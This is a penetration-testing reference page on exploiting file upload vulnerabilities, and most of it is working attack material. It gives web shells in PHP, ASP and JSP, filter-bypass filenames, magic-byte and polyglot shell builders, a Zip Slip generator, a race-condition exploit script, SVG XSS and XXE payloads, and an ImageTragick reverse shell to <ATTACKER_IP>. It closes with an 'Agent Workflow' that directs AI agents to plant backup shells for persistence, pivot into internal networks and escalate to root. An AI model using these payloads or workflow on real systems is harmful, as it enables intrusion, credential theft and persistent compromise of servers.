# File Upload

> **Summary**: File upload vulnerabilities occur when an application allows users to upload files without properly validating file type, content, name, or storage location, enabling execution of malicious code, path traversal, or secondary attacks.
> **Impact**: Remote Code Execution (web shell), Stored XSS, XXE, SSRF, denial of service, arbitrary file overwrite.
> **Typical Severity**: High | Critical

## Detection

### Indicators

- Application has file upload functionality (profile pictures, document uploads, import features)
- Uploaded files are stored in a web-accessible directory
- The server reflects the filename or file content in responses
- Upload responses reveal storage paths or file URLs
- The application processes images (resizing, thumbnails) server-side

### Automated Detection

```bash
# Nuclei -- file upload vulnerability templates
nuclei -u <TARGET_URL> -tags file-upload,upload -o <OUTPUT_FILE>

# Burp Suite extension -- Upload Scanner
# Install "Upload Scanner" from BApp Store, then right-click upload request -> "Send to Upload Scanner"

# Upload Bypass -- automated upload testing
python3 upload_bypass.py -u <UPLOAD_URL> -e php
```

### Manual Detection

1. Upload a legitimate file and observe the response (storage path, URL, filename handling).
2. Check if uploaded files are accessible via direct URL and if the server executes them.
3. Test with various extensions to determine which are blocked and which are allowed.
4. Inspect `Content-Type` validation by changing the header while keeping a malicious file.
5. Check if the file content is validated (magic bytes check).

## Exploitation

### Prerequisites

- An upload endpoint that accepts files
- Knowledge of the server-side technology (PHP, ASP, JSP, etc.)
- The uploaded file must be reachable via a URL, or a secondary vulnerability (LFI) to include it

### Step-by-Step

1. **Identify the upload endpoint** and upload a benign file to understand the response behavior.
   - Success: The server returns the storage path or URL of the uploaded file.
2. **Determine server-side technology** by examining headers, error messages, or known paths.
   - Success: You know whether the backend runs PHP, ASP.NET, Java/JSP, Python, etc.
3. **Test extension filtering** by uploading files with executable extensions.
   - Success: Identify which extensions are blocked and which bypass the filter.
4. **Bypass validation** using one or more techniques below.
   - Success: A file with an executable extension is accepted by the server.
5. **Access the uploaded file** via its URL and confirm code execution.
   - Success: The web shell executes and returns command output (e.g., `whoami`).

### Extension Bypass Techniques

#### Case Manipulation
```
.pHp, .Php, .pHP5, .PhAr, .aSp, .aSpX, .jSp
```

#### Double Extensions
```
shell.php.jpg
shell.php.png
shell.asp.jpg
shell.php5.png
```

#### Null Byte Injection (legacy / PHP < 5.3.4)
```
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
```

#### Special Characters at End
```
shell.php%20
shell.php%0a
shell.php%0d%0a
shell.php/
shell.php.\
shell.php....
shell.php%00.jpg
```

#### Alternative Executable Extensions

| Technology | Extensions |
|-----------|------------|
| **PHP** | `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.pht`, `.phar`, `.phps`, `.pgif`, `.inc`, `.hphp`, `.ctp`, `.module` |
| **ASP/ASPX** | `.asp`, `.aspx`, `.ashx`, `.asmx`, `.config`, `.cshtml`, `.vbhtml`, `.cer`, `.asa`, `.shtml` |
| **JSP** | `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.action` |
| **ColdFusion** | `.cfm`, `.cfml`, `.cfc`, `.dbm` |
| **Perl** | `.pl`, `.cgi` |

#### NTFS Alternate Data Stream (Windows)
```
shell.asp::$data
shell.asp::$data.
shell.aspx:evil.txt
```

#### Filename Length Truncation
```bash
# Linux max filename: 255 bytes -- fill with padding so extension gets truncated
python -c "print('A' * 232 + '.php.png')"
# Server truncates to 236 chars, leaving "AAA...AAA.php"
```

### Content-Type Bypass

Change the `Content-Type` header while keeping the malicious file body:
```
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/octet-stream
```

### Magic Bytes Manipulation

Prepend valid image magic bytes to a web shell:
```bash
# PNG magic bytes + PHP shell
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png

# GIF magic bytes + PHP shell
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# JPEG magic bytes + PHP shell
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.jpg.php
```

Inject payload into image metadata:
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

### Web Shell Payloads

#### PHP
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

#### ASP
```asp
<%eval request("cmd")%>
```

#### ASPX
```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>
```

#### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### .htaccess Upload (Apache)

If you can upload `.htaccess` files, make the server treat a custom extension as PHP:
```apache
AddType application/x-httpd-php .evil
```
Then upload `shell.evil` with PHP code inside.

### .config Upload (IIS/ASP.NET)

Upload a `web.config` file to enable code execution:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" />
      </handlers>
   </system.webServer>
</configuration>
```

### SVG XSS

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
```

### SVG XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### ImageTragick (ImageMagick CVE-2016-3714)

Upload a file with an image extension containing:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.jpg"|bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1|touch "x)'
pop graphic-context
```
- Success: Reverse shell if the server processes images with a vulnerable ImageMagick version.

### Zip Slip (Path Traversal via Archive Extraction)

```python
import zipfile
from io import BytesIO

def create_zip_slip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/shell.php',
               '<?php system($_REQUEST["cmd"]); ?>')
    z.close()
    with open('evil.zip', 'wb') as out:
        out.write(f.getvalue())

create_zip_slip()
```
- Upload `evil.zip` where the server auto-extracts archives.
- Success: `shell.php` written outside the intended directory.

### Symlink via ZIP

```bash
ln -s /etc/passwd symlink.txt
zip --symlinks evil.zip symlink.txt
```
- Upload and extract: reading `symlink.txt` returns `/etc/passwd` contents.

### Polyglot Files

A file that is valid in multiple formats simultaneously (e.g., a valid JPEG that is also valid PHP):
- GIFAR: GIF + RAR archive
- PHAR + JPEG: Valid JPEG with embedded PHP archive

```bash
# Create a PHP-JPEG polyglot
# Start with valid JPEG, append PHP after the JPEG end marker
cat legitimate.jpg > polyglot.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php.jpg
```

### Race Condition in Upload

If the server uploads the file first, then validates/deletes it:
```python
import requests
import threading

def upload():
    while True:
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        requests.post('<UPLOAD_URL>', files=files)

def access():
    while True:
        r = requests.get('<FILE_URL>/shell.php?cmd=id')
        if 'uid=' in r.text:
            print('[+] RCE achieved!')
            break

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```
- See: [Race Conditions](race-conditions.md)

### PDF Upload to XXE/XSS

- Craft a PDF with JavaScript: `app.alert(document.domain)`
- Craft a PDF with XXE in embedded XML streams
- See: [XXE](xxe.md), [XSS](xss.md)

## Bypasses

### Compression Surviving Payloads (PHP-GD)

When the server resizes or recompresses images using PHP-GD:
- **PLTE chunk technique**: Inject PHP code into the PLTE chunk of a PNG (survives `imagecopyresized`).
- **IDAT chunk technique**: Encode a PHP shell in the IDAT data stream (survives resampling).
- **tEXt chunk technique**: Inject into the tEXt metadata chunk (survives `thumbnailImage`).

Reference: https://github.com/synacktiv/astrolock

### Storage-Specific Bypasses

#### AWS S3
- If files are served directly from S3 with `Content-Type` set by the uploader, manipulate the type to `text/html` for XSS.
- Misconfigured bucket policies may allow overwriting existing files.

#### Azure Blob Storage
- Check if the storage account allows anonymous read access.
- Test for `Content-Type` manipulation similar to S3.

### Server-Specific Tricks

| Server | Technique |
|--------|-----------|
| **Apache** | Upload `.htaccess` to redefine handlers; use `AddType application/x-httpd-php .evil` |
| **IIS** | Upload `web.config`; use NTFS ADS (`file.asp::$data`) |
| **Nginx** | Path confusion: `/uploads/image.jpg/shell.php` if `cgi.fix_pathinfo=1` |
| **Tomcat/Jetty** | Upload `.xml` or `.war` files to `webapps/` for auto-deployment |
| **uWSGI** | Upload `.ini` config files with `@(exec://command)` syntax |

### Filename-Based Attacks (Secondary Vulnerabilities)

```
# Path traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# SQL injection via filename
sleep(10)-- -.jpg

# XSS via filename
<svg onload=alert(1)>.jpg

# Command injection via filename
; sleep 10;.jpg
`whoami`.jpg
```

## Escalation

- **File Upload to RCE**: Upload a web shell, access it via URL -> full server compromise. See: [Command Injection](command-injection.md)
- **File Upload to LFI chain**: Upload a file (even with a safe extension), then include it via LFI for code execution. See: [LFI](lfi.md)
- **File Upload to SSRF**: Server-side image processing fetches attacker-controlled URLs. See: [SSRF](ssrf.md)
- **File Upload to XSS**: SVG uploads, HTML uploads, or manipulated `Content-Type` for stored XSS. See: [XSS](xss.md)
- **File Upload to XXE**: SVG or DOCX/XLSX uploads with embedded XML entities. See: [XXE](xxe.md)
- **File Upload to DoS**: Pixel flood attack (decompression bomb), zip bomb, or recursive archive extraction.

## Tools

| Tool | Usage |
|------|-------|
| [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) | `python3 upload_bypass.py -u <URL> -e php` |
| [fuxploider](https://github.com/almandin/fuxploider) | `python3 fuxploider.py --url <URL> --not-regex "error"` |
| [Burp Upload Scanner](https://github.com/portswigger/upload-scanner) | BApp Store extension for automated upload testing |
| [exiftool](https://exiftool.org/) | `exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg` |
| [evilarc](https://github.com/ptoomey3/evilarc) | `python2 evilarc.py -o unix -d 5 -p /var/www/html/ shell.php` |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files) | Comprehensive upload payload reference |

## Quick Reference: Upload to Impact

| Extension/Type | Impact |
|----------------|--------|
| PHP / ASP / JSP | Web shell / RCE |
| SVG | Stored XSS / SSRF / XXE |
| HTML / JS | XSS / Open redirect |
| XML | XXE |
| CSV | CSV injection |
| ZIP | Path traversal (Zip Slip) / DoS (zip bomb) |
| PDF / PPTX | SSRF / Blind XXE / XSS |
| PNG / JPEG | Pixel flood DoS |
| AVI | LFI / SSRF |
| .htaccess / web.config | Server reconfiguration / RCE |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. **Identify upload functionality**:
   - Locate all file upload endpoints in the application: profile picture uploads, document imports, avatar changes, attachment features, import/export tools.
   - Record each: `<UPLOAD_URL>`, `<FILE_PARAMETER>`, `<FORM_ACTION>`, `<ALLOWED_FILE_TYPES>` (from client-side validation or documentation).
2. **Determine server-side technology**:
   - Identify the backend language from response headers (`X-Powered-By`, `Server`), file extensions, cookies (`PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`), and error messages.
   - Record: `<BACKEND_LANGUAGE>` (PHP/ASP/JSP/Python/etc.), `<WEB_SERVER>` (Apache/Nginx/IIS/Tomcat).
3. **Upload a benign file and analyze the response**:
   - Upload a valid file (e.g., `test.jpg`) and record:
     - `<UPLOAD_RESPONSE>`: Does it return the file URL/path?
     - `<FILE_ACCESS_URL>`: Can the uploaded file be accessed directly via a URL?
     - `<STORAGE_LOCATION>`: Is the file stored in a web-accessible directory?
     - `<FILENAME_HANDLING>`: Does the server rename the file, preserve the name, or hash it?
   - **IF** file is accessible via URL and server does not rename it --> high chance of exploitation.

### Phase 2: Validation
1. **Test extension filtering** -- upload files with executable extensions for the detected backend:
   - **IF** `<BACKEND_LANGUAGE>` is PHP: try `.php`, `.php5`, `.phtml`, `.phar`, `.pht`, `.phps`, `.pgif`, `.inc`.
   - **IF** `<BACKEND_LANGUAGE>` is ASP: try `.asp`, `.aspx`, `.ashx`, `.cer`, `.asa`, `.config`.
   - **IF** `<BACKEND_LANGUAGE>` is JSP: try `.jsp`, `.jspx`, `.jsw`, `.jspf`.
   - **IF** upload succeeds with any executable extension --> move to Phase 3.
   - **IF** all executable extensions are blocked --> proceed to bypass techniques.
2. **Test bypass techniques in order**:
   - **Double extension**: `shell.php.jpg`, `shell.php.png`, `shell.asp.jpg`.
     - **IF** accepted and executed --> bypass found.
   - **Case manipulation**: `.pHp`, `.PhP5`, `.aSp`, `.aSpX`.
     - **IF** accepted and executed --> bypass found.
   - **Null byte** (PHP < 5.3.4): `shell.php%00.jpg`, `shell.php\x00.png`.
     - **IF** server truncates at null byte and executes PHP --> bypass found.
   - **Special characters**: `shell.php%20`, `shell.php%0a`, `shell.php.`, `shell.php....`, `shell.php/`.
     - **IF** any variation accepted and executed --> bypass found.
   - **Content-Type manipulation**: Keep malicious file body but set `Content-Type: image/jpeg` or `image/png`.
     - **IF** server only checks Content-Type header --> bypass found.
   - **Magic bytes prepend**: Prepend valid image magic bytes to the web shell:
     - PNG: `\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>`
     - GIF: `GIF89a<?php system($_GET["cmd"]); ?>`
     - JPEG: `\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>`
     - **IF** server checks magic bytes but not content --> bypass found.
   - **NTFS ADS** (Windows/IIS): `shell.asp::$data`.
   - **Filename length truncation**: Generate a filename of 232+ characters ending in `.php.png` (server truncates to `.php`).
3. **Test alternative upload vectors**:
   - **`.htaccess` upload** (Apache): Upload `.htaccess` with `AddType application/x-httpd-php .evil`, then upload `shell.evil`.
   - **`web.config` upload** (IIS): Upload a `web.config` enabling script execution, then upload the shell.
   - **Metadata injection**: `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg` then upload as `.php.jpg`.
   - **Zip Slip**: Create a ZIP with path traversal in filenames (`../../../var/www/html/shell.php`) and upload where auto-extraction occurs.

### Phase 3: Exploitation
1. **Upload the web shell**:
   - Using the successful bypass technique from Phase 2, upload a minimal web shell:
     - PHP: `<?php system($_GET['cmd']); ?>`
     - ASP: `<%eval request("cmd")%>`
     - JSP: `<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>`
2. **Access the uploaded shell**:
   - Navigate to `<FILE_ACCESS_URL>/<UPLOADED_FILENAME>?cmd=id`.
   - **IF** command output appears (e.g., `uid=33(www-data)`) --> RCE confirmed.
   - **IF** file is not directly accessible --> try:
     - Chain with LFI to include the uploaded file (see [LFI](lfi.md)).
     - Check for path traversal in the upload (Zip Slip) to write to a known web directory.
     - Check Nginx path confusion: `<FILE_ACCESS_URL>/image.jpg/shell.php` (if `cgi.fix_pathinfo=1`).
3. **IF no code execution possible, test secondary impacts**:
   - **SVG XSS**: Upload SVG with `<svg onload="alert(document.domain)">` --> stored XSS.
   - **SVG XXE**: Upload SVG with `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` --> file read.
   - **HTML upload**: Upload `.html` file with JavaScript --> stored XSS.
   - **DOCX/XLSX XXE**: Inject XXE payloads into Office document XML (see [XXE](xxe.md)).

### Phase 4: Escalation
1. **Establish persistence**:
   - Upload a more capable web shell (e.g., p0wny-shell, weevely) to a less obvious path.
   - Create a backup shell in a different directory in case the first is discovered.
2. **Pivot to internal network**:
   - Use the web shell to enumerate the internal network: `ip addr`, `arp -a`, `cat /etc/hosts`.
   - Upload tunneling tools (chisel, ligolo) for pivoting.
   - Read application configuration files for database credentials and internal service URLs.
3. **Escalate privileges**:
   - From web shell, enumerate local privilege escalation vectors: SUID binaries, sudo permissions, kernel version.
   - Attempt to escalate from `www-data` to `root`.

## Decision Tree

```
Start: File upload endpoint identified
|
|--> Upload benign file, record: <FILE_ACCESS_URL>, <FILENAME_HANDLING>
|
|--> Test executable extension upload (e.g., .php, .asp, .jsp)
|    |
|    |--> [Accepted and executes] --> DIRECT WEB SHELL UPLOAD
|    |    |--> Upload web shell, access via URL, confirm RCE
|    |
|    |--> [Extension blocked] --> Test EXTENSION FILTER BYPASSES
|         |
|         |--> Double extension (shell.php.jpg)
|         |--> Case manipulation (.pHp, .PhP5)
|         |--> Null byte (shell.php%00.jpg)
|         |--> Special chars (shell.php%20, shell.php.)
|         |--> Alternative extensions (.php5, .phtml, .phar)
|         |    |
|         |    |--> [Any bypass works] --> Upload web shell with bypass
|         |    |
|         |    |--> [All blocked] --> Test CONTENT-TYPE FILTER
|         |         |
|         |         |--> Set Content-Type: image/jpeg with PHP body
|         |         |    |
|         |         |    |--> [Accepted] --> Upload shell with spoofed Content-Type
|         |         |    |
|         |         |    |--> [Blocked] --> Test MAGIC BYTES FILTER
|         |         |         |
|         |         |         |--> Prepend GIF89a/PNG/JPEG magic bytes to shell
|         |         |         |    |
|         |         |         |    |--> [Accepted and executes] --> RCE via polyglot
|         |         |         |    |
|         |         |         |    |--> [Blocked] --> Test SERVER CONFIG UPLOAD
|         |         |         |         |
|         |         |         |         |--> .htaccess upload (Apache)
|         |         |         |         |--> web.config upload (IIS)
|         |         |         |         |--> Race condition (upload then access before delete)
|         |         |         |         |
|         |         |         |         |--> [Config upload works] --> Redefine handler, upload shell
|         |         |         |         |--> [Nothing works] --> Test SECONDARY IMPACTS
|         |         |         |              |--> SVG XSS / SVG XXE / HTML XSS / DOCX XXE
|         |         |         |              |--> Zip Slip path traversal
|         |         |         |              |--> LFI chain with uploaded file
```

## Success Criteria

- **Minimum PoC**: Uploaded a file with content controlled by the attacker that is stored and accessible on the server (even without code execution, proves the filter is bypassable).
- **Confirmed Impact**: Achieved code execution via uploaded web shell (demonstrated `whoami` or `id` command output).
- **Escalation Confirmed**: Established persistent access (durable web shell), read sensitive config files, or pivoted to internal network.
- **Evidence Required**: (1) The upload HTTP request showing the bypass technique used, (2) the file access URL confirming storage, (3) command execution output from the web shell.

## References

- https://book.hacktricks.wiki/en/pentesting-web/file-upload/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
- https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
- https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a
- https://en.wikipedia.org/wiki/List_of_file_signatures
